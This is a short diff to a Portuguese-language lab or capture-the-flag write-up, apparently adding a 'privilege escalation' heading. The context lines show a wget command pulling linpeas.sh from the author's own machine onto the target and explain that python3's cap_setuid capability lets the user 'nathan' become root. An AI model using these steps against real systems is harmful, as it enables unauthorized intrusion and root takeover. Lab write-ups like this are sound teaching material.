@@ -40,7 +40,7 @@ Na máquina alvo:
 ````bash
 wget http://<ipDaMinhaMaquina>:8000/linpeas.sh
 ````
-
+## Escalação de privilégios
 Executei o linpeas na máquina alvo e ele me revelou que o python3 tinha cap_setuid, que é a capacidade de alterar o UID dos usuários, o que me possibilitaria alterar o UID do usuário "nathan" o tornando root ( root = UID 0).
 
 <img width="466" height="53" alt="set-uid" src="https://github.com/user-attachments/assets/f98ee82a-ba1a-4a50-96fc-a9301225b367" /> 
